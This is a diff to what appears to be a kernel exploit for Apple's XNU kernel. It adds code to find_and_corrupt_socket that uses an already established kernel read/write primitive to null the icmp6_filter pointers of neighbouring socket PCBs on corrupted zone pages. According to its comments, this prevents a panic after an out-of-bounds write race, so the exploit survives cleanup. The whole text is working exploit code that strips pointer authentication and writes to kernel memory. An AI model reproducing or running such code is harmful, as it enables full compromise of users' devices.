@@ -719,6 +719,25 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		// read controlSocketPcb NOW while inp_list is intact (sockets_release will tear it down)
 		controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
 		printf("[i] controlSocketPcb=%#llx\n", controlSocketPcb); fflush(stdout);
+
+		// NULL all icmp6_filter pointers on the target zone page BEFORE sockets_release.
+		// The OOB write race may have corrupted neighboring PCBs' filters with stale data.
+		// When sockets_release frees those sockets, rip6_detach → kfree_type would panic
+		// on the corrupted pointer. NULLing makes rip6_detach skip the kfree entirely.
+		// We can safely do this now because KRW is established and all sockets are alive.
+		// NULL filters on both pages (rwSocket's and controlSocket's, may be different pages)
+		uint64_t pages[2] = { rwSocketPcb & ~0x3FFFULL, controlSocketPcb & ~0x3FFFULL };
+		int npages = (pages[0] == pages[1]) ? 1 : 2;
+		for (int pg = 0; pg < npages; pg++) {
+			for (int pi = 0; pi < 16; pi++) {
+				uint64_t pcbAddr = pages[pg] + pi * 0x400;
+				if (pcbAddr == controlSocketPcb)
+					continue;
+				early_kwrite64(pcbAddr + OFFSET_ICMP6FILT, 0);
+			}
+		}
+		printf("[i] NULLed filters on %d page(s)\n", npages); fflush(stdout);
+
 		return KERN_SUCCESS;
 	}
 	return -1;
